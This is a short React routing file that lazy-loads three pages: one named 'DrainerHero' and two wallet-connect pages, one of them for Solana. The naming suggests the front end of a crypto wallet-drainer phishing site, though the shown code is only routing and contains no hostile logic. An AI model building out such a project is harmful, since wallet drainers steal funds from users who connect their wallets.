import React, { Suspense, lazy } from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';

// Lazy-loaded pages (code-splitting)
const DrainerHero = lazy(() => import('./components/Drainer'));
const Connect = lazy(() => import('./components/connectwallet'));
const SolanaConnect = lazy(() => import('./components/SolanaConnect'));

function App() {
  return (
    <Router>
      <Suspense fallback={<div className="flex items-center justify-center h-screen text-white">Loading...</div>}>
        <Routes>
          <Route path="/" element={<DrainerHero />} />
          <Route path="/connect" element={<Connect />} />
          <Route path="/solana" element={<SolanaConnect />} />
        </Routes>
      </Suspense>
    </Router>
  );
}

export default App;
